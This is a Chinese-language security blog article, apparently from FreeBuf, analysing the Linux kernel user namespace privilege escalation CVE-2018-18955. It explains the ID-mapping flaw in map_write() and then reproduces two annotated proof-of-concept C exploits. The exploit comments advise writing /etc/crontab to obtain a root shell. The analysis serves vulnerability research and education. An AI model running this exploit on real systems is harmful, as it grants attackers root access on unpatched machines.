@@ -1,0 +1,370 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ***本文作者：0x4d69，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
+ **鉴于目前还没有针对这个漏洞的详细分析，原作者的advisory对新手来说也很不友好，我就写了这篇文章。**
+
+## 相关知识
+
+### user namespace
+
+假设你使用Linux，`man user_namespaces` 就可以给你一个很详细的介绍。
+
+如果你还不知道namespace（以下简称ns）是什么东西，那么 `man namespaces` 会给出答案：
+
+    
+    
+    Namespace   Constant          Isolates
+    Cgroup      CLONE_NEWCGROUP   Cgroup root directory
+    IPC         CLONE_NEWIPC      System V IPC, POSIX message queues
+    Network     CLONE_NEWNET      Network devices, stacks, ports, etc.
+    Mount       CLONE_NEWNS       Mount points
+    PID         CLONE_NEWPID      Process IDs
+    User        CLONE_NEWUSER     User and group IDs
+    UTS         CLONE_NEWUTS      Hostname and NIS domain name
+    
+
+其中，user ns：
+
+> User namespaces isolate security-related identifiers and attributes, in
+> particular, user IDs and group IDs (see credentials(7)), the root directory,
+> keys (see keyrings(7)), and capabilities (see capabili‐ ties(7)). A
+> process's user and group IDs can be different inside and outside a user
+> namespace. In par‐ ticular, a process can have a normal unprivileged user ID
+> outside a user namespace while at the same time having a user ID of 0 inside
+> the namespace; in other words, the process has full privileges for opera‐
+> tions inside the user namespace, but is unprivileged for operations outside
+> the namespace.
+
+解释下，user ns用于隔离安全相关的标识符，主要是uid和gid等。这里特别提到，一个进程的uid和gid在它的user
+ns内外可以不同，比如你可以在外边拥有低权限的uid，在自己的user ns里则可以是root的uid，你可以理解为，这个进程在自己user
+ns里拥有root权限，但在这之外没有此权限。
+
+这个漏洞涉及到nested user ns（嵌套用户命名空间），它利用了创建nested ns时损坏的id
+mapping（id映射）来达到提权目的。所谓nested，就是一个user ns的子ns。
+
+> User namespaces can be nested; that is, each user namespace—except the
+> initial ("root") namespace— has a parent user namespace, and can have zero
+> or more child user namespaces. The parent user namespace is the user
+> namespace of the process that creates the user namespace via a call to
+> unshare(2) or clone(2) with the CLONE_NEWUSER flag.
+
+### 关于uid/gid mapping
+
+既然提到了id mapping，我觉得也有必要进行说明。这个机制保证了nested user ns里面，进程所具有的权限不会逾越它父ns的框框。
+
+从 `man newuidmap`，我们可以得到这样的内容：
+
+    
+    
+    uid
+        Beginning of the range of UIDs inside the user namespace.
+    
+    loweruid
+        Beginning of the range of UIDs outside the user namespace.
+    
+    count
+        Length of the ranges (both inside and outside the user namespace).
+    
+
+对于 `loweruid` ，有一个限制，写在 `/etc/subuid` 里面：
+
+> newuidmap verifies that the caller is the owner of the process indicated by
+> pid and that for each of the above sets, each of the UIDs in the range
+> [loweruid, loweruid+count] is allowed to the caller according to /etc/subuid
+> before setting /proc/[pid]/uid_map
+
+比如，我的是这样的：
+
+![](https://image.3001.net/images/20190302/1551500886_5c7a0656045eb.png!small)
+
+所以我可以创建像 `0 100000 1000`这样的mapping。
+
+## 漏洞分析
+
+### 漏洞溯源
+
+![](https://image.3001.net/images/20190302/1551502031_5c7a0acf131c0.png!small)
+
+从[原advisory](https://www.exploit-db.com/exploits/45886)可以了解到 `6397fac4915a`
+这个commit是导致漏洞的根源。
+
+他的修复diff如下：
+
+![](https://image.3001.net/images/20190302/1551502362_5c7a0c1a75b7d.png!small)看起来他仅仅是把这几句挪个位置而已啊（嗯，他还加了个注释，不过我相信大多数人看到注释也不知道那是什么用意）。
+
+所以我们完整的看一遍这一块代码再琢磨。
+
+本文不再介绍如何查看linux源码了，你也可以直接在kernel.org去看。
+
+涉及到的代码都来自 `kernel/user_namespace.c`，我们定位到 补丁所在的`map_write()` 看看它是做什么的：
+
+在第一个循环里，`insert_extent()` 把mapping的每一个extent都写入 `new_map`（类型是 `struct
+uid_gid_map`）。
+
+![image.png](https://image.3001.net/images/20190302/1551504056_5c7a12b836e5c.png!small)
+
+extent 代表一行id mapping（如果你的mapping有不止一行的话），像这样：
+
+    
+    
+    0 0 1
+    1 1 1
+    2 2 1
+    3 3 1
+    4 4 1
+    5 5 995
+    
+
+这个mapping有6个extent。
+
+然后 `new_map` 调用 `sort_idmaps()` 来对两个方向的mapping进行排序（`new_map->forward`,
+`new_map->reverse`）。
+
+![](https://image.3001.net/images/20190302/1551504190_5c7a133eeea0b.png!small)
+
+`UID_GID_MAP_MAX_BASE_EXTENTS` 是5，你可以在`struct uid_gid_map`截图中找到它。
+
+当extents数量（`map->nrextents`）超过5，`sort_idmaps()`
+给它两个方向的mapping数组分别排序，随后的`bsearch()`会 用到。
+
+这两个数组（forward和reverse）代表id mapping的两个方向，如原advisory所说：
+
+> binary search over a sorted array of struct uid_gid_extent is used. Because
+> ID mappings are queried in both directions (kernel ID to namespaced ID and
+> namespaced ID to kernel ID), two copies of the array are created, one per
+> direction, and they are sorted differently.
+
+![](https://image.3001.net/images/20190302/1551504198_5c7a1346ce194.png!small)
+
+排序之后，每个`new_map`的extent都进入了第二个循环。
+
+![](https://image.3001.net/images/20190302/1551507741_5c7a211d50183.png!small)`map_id_range_down()`做了这些事情：
+
+![image.png](https://image.3001.net/images/20190302/1551507796_5c7a215448ed5.png!small)
+
+在这个循环中，`new_map`（也就是我们要建立的nested ns）中的 `lower_first` 成员（也就是父ns的起始id），被
+`parent_map` 的 `lower_first` 所替代。也就是说，`lower_first` id已经映射到内核ns。
+
+在`map_id_range_down()`之后，`new_map->forward`的`lower_first`
+id已经更新，但`new_map->reverse`的却没有改变。
+
+让我们总结一下，`map_write()`做了什么：
+
+![image.png](https://image.3001.net/images/20190302/1551511983_5c7a31aff2b51.png!small)
+
+可以看出，`map_write()` 需要父ns的id mapping，和要写入的mapping作为参数，它把每个extent都写入
+`new_map`，然后给双向两个mapping数组排序，映射 `new_map->forward` 的 `lower_first` id到内核，但
+`new_map->reverse` 没有变化。在这个过程中，`parent_map`的`lower_first`提供了向内核id映射的桥梁。
+
+而reverse mapping，也就是把内核的id映射到nested ns的mapping，仍然是 `sort_idmaps()`
+生成的那一个，没有被碰过。
+
+是的，`new_map->reverse` 是这样被 `sort_idmaps()` 生成的：
+
+![image.png](https://image.3001.net/images/20190302/1551513050_5c7a35da64fdb.png!small)它只是
+**forward mapping的一份copy** 而已，只不过后来使用了不同的排序。
+
+因为排序发生在map to kernel循环 **之前** ，reverse mapping实际上是没有经过处理的。是的，因为 **forward
+mapping还没完成map to kernel** 啊，你就复制出来一份reverse mapping，这样出来的reverse
+mapping到最后就直接写入目标map了，造成一个 **没有经过限制的kernel to ns mapping。**
+
+所以，如果我们使用 `0..1000` 这样的初始uid范围去建立一个nested ns，最终我们将得到一个 `0..1000` 的kernel to
+ns的uid mapping，也就是说，你在nested ns里，真的就是 `0..1000` 的uid了。
+
+### 如何利用
+
+据CVE-2018-18955的作者（[jannh@google.com](mailto:jannh@google.com)）所说，`from_kuid()`
+被用在 `kuid_has_mapping()`，而后者接着又被类似于 `inode_owner_or_capable()` 和
+`privileged_wrt_inode_uidgid()`这样的权限检查函数所使用。
+
+这里就引入提权漏洞了，`from_kuid()` 返回错误的id，造成权限检查的错误，因此攻击者可以意外得到他们本没有权限的inode的权限。
+
+以下截图演示了利用过程：
+
+![image.png](https://image.3001.net/images/20190302/1551515342_5c7a3eceec206.png!small)
+
+![image.png](https://image.3001.net/images/20190302/1551515359_5c7a3edf3cf67.png!small)
+
+![image.png](https://image.3001.net/images/20190302/1551515366_5c7a3ee65f0c8.png!small)
+
+最终，我们触发了`map->reverse`里的索引，而这个数组从一开始创建就已经出问题了。
+
+### PoC
+
+下图演示了该漏洞的利用过程，PoC可以在[这里](https://www.exploit-db.com/exploits/45886)找到。
+
+![image.png](https://image.3001.net/images/20190302/1551516334_5c7a42aebe2c9.png!small)
+
+如图，你也可以选择写入 `/etc/crontab`，来以root权限直接执行你想执行的东西。
+
+感谢阅读如此枯燥难懂的漏洞分析，下面为大家奉上更枯燥的PoC代码（经过本人注释的）：
+
+### subuid_shell.c
+
+    
+    
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <fcntl.h>
+    #include <grp.h>
+    #include <sched.h>
+    #include <signal.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <sys/prctl.h>
+    #include <sys/socket.h>
+    #include <sys/un.h>
+    #include <sys/wait.h>
+    #include <unistd.h>
+    
+    int main(void)
+    {
+        int sync_pipe[2];
+        char dummy;
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe))
+            err(1, "pipe");
+    
+        pid_t child = fork();
+        if (child == -1)
+            err(1, "fork");
+        if (child == 0) {
+            // kill child if parent dies
+            prctl(PR_SET_PDEATHSIG, SIGKILL);
+            close(sync_pipe[1]);
+    
+            // create new ns
+            if (unshare(CLONE_NEWUSER))
+                err(1, "unshare userns");
+    
+            if (write(sync_pipe[0], "X", 1) != 1)
+                err(1, "write to sock");
+            if (read(sync_pipe[0], &dummy, 1) != 1)
+                err(1, "read from sock");
+    
+            // set uid and gid to 0, in child ns
+            if (setgid(0))
+                err(1, "setgid");
+            if (setuid(0))
+                err(1, "setuid");
+    
+            // replace process with bash shell, in which you will see "root",
+            // as the setuid(0) call worked
+            // this might seem a little confusing, but you are "root" only to this child ns,
+            // thus, no permission to the outside ns
+            execl("/bin/bash", "bash", NULL);
+            err(1, "exec");
+        }
+    
+        close(sync_pipe[0]);
+        if (read(sync_pipe[1], &dummy, 1) != 1)
+            err(1, "read from sock");
+    
+        // set id mapping (0..1000) for child process
+        char cmd[1000];
+        sprintf(cmd, "echo deny > /proc/%d/setgroups", (int)child);
+        if (system(cmd))
+            errx(1, "denying setgroups failed");
+        sprintf(cmd, "newuidmap %d 0 100000 1000", (int)child);
+        if (system(cmd))
+            errx(1, "newuidmap failed");
+        sprintf(cmd, "newgidmap %d 0 100000 1000", (int)child);
+        if (system(cmd))
+            errx(1, "newgidmap failed");
+    
+        if (write(sync_pipe[1], "X", 1) != 1)
+            err(1, "write to sock");
+    
+        int status;
+        if (wait(&status) != child)
+            err(1, "wait");
+        return 0;
+    }
+    
+
+### subshell.c
+
+    
+    
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <fcntl.h>
+    #include <grp.h>
+    #include <sched.h>
+    #include <stdio.h>
+    #include <sys/socket.h>
+    #include <sys/un.h>
+    #include <sys/wait.h>
+    #include <unistd.h>
+    
+    int main(void)
+    {
+        int sync_pipe[2];
+        char dummy;
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe))
+            err(1, "pipe");
+    
+        // create a child process
+        pid_t child = fork();
+        if (child == -1)
+            err(1, "fork");
+        if (child == 0) {
+            // in child process
+            close(sync_pipe[1]);
+    
+            // this creates a new ns
+            if (unshare(CLONE_NEWUSER))
+                err(1, "unshare userns");
+            if (write(sync_pipe[0], "X", 1) != 1)
+                err(1, "write to sock");
+    
+            if (read(sync_pipe[0], &dummy, 1) != 1)
+                err(1, "read from sock");
+    
+            // start a bash process (replace process image)
+            // this time you are actually root, without the name/id, though
+            // technically the root access is not complete,
+            // to get complete root, write to /etc/crontab and wait for a root shell to pop up
+            execl("/bin/bash", "bash", NULL);
+            err(1, "exec");
+        }
+    
+        close(sync_pipe[0]);
+        if (read(sync_pipe[1], &dummy, 1) != 1)
+            err(1, "read from sock");
+    
+        char pbuf[100]; // path of uid_map
+        sprintf(pbuf, "/proc/%d", (int)child);
+    
+        // cd to /proc/pid/uid_map
+        if (chdir(pbuf))
+            err(1, "chdir");
+    
+        // our new id mapping with 6 extents (> 5 extents)
+        const char* id_mapping = "0 0 1\n1 1 1\n2 2 1\n3 3 1\n4 4 1\n5 5 995\n";
+    
+        // write the new mapping to uid_map and gid_map
+        int uid_map = open("uid_map", O_WRONLY);
+        if (uid_map == -1)
+            err(1, "open uid map");
+        if (write(uid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping))
+            err(1, "write uid map");
+        close(uid_map);
+        int gid_map = open("gid_map", O_WRONLY);
+        if (gid_map == -1)
+            err(1, "open gid map");
+        if (write(gid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping))
+            err(1, "write gid map");
+        close(gid_map);
+        if (write(sync_pipe[1], "X", 1) != 1)
+            err(1, "write to sock");
+    
+        int status;
+        if (wait(&status) != child)
+            err(1, "wait");
+        return 0;
+    }
+    
+
+***本文作者：0x4d69，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
